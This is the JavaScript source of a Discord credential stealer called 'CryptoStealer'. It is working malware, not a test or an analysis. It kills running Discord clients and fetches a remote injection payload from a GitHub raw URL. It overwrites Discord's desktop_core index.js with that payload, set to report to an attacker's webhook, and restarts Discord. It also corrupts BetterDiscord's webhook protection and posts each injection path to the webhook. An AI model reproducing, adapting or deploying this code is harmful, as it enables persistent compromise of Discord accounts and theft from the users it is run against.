// Made by https://github.com/CryptoWare38/CryptoStealer

const glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "webhook"
const config = {
    "logout": "instant",
    "inject-notify": "true", // when you want to turn off do false
    "logout-notify": "false", // when you want to turn on true
    "init-notify": "false", // when you want to turn on true
    "embed-color": 3447704, //your webhook color
    "disable-qr-code": "true" // when you want to turn off do false
}
let LOCAL = process.env.LOCALAPPDATA
let discords = [];
let injectPath = [];
let runningDiscords = [];

fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
}); // Made by https://github.com/CryptoWare38/CryptoStealer

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
});

listDiscords(); // Made by https://github.com/CryptoWare38/CryptoStealer 

function Infect() {
    https.get('https://raw.githubusercontent.com/CryptoWare38/CryptoStealer/main/src/injection/injection.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace(3447704,config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {  // Made by https://github.com/CryptoWare38/CryptoStealer
                    encoding: 'utf8',
                    flag: 'w'
                });

                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    } // Made by https://github.com/CryptoWare38/CryptoStealer
                }

                if ( config.logout != "false" ) {
                    let folder = file.replace("index.js", "CryptoStealer")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
        });
    }).on("error", (err) => {
        console.log(err); // Made by https://github.com/CryptoWare38/CryptoStealer
    });
};

function listDiscords() {
    exec('tasklist', function(err, stdout, stderr) {
        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");

        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })
}; // Made by https://github.com/CryptoWare38/CryptoStealer

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => { // Made by https://github.com/CryptoWare38/CryptoStealer
            if (err) {
              return;
            }
        });
    });

    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify(); // Made by https://github.com/CryptoWare38/CryptoStealer
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
        });
    });
};

function pwnBetterDiscord() {
    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        let x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "gaysarecool"))
    }

    return;
} // Made by https://github.com/CryptoWare38/CryptoStealer

function injectNotify() {
    let fields = [];
    injectPath.forEach( path => {
        let c = { // Made by https://github.com/CryptoWare38/CryptoStealer
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "CryptoStealer"
            }, // Made by https://github.com/CryptoWare38/CryptoStealer
            "footer": {
              "text": "CryptoStealer"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {
 // Made by https://github.com/CryptoWare38/CryptoStealer
    })
}
 // Made by https://github.com/CryptoWare38/CryptoStealer
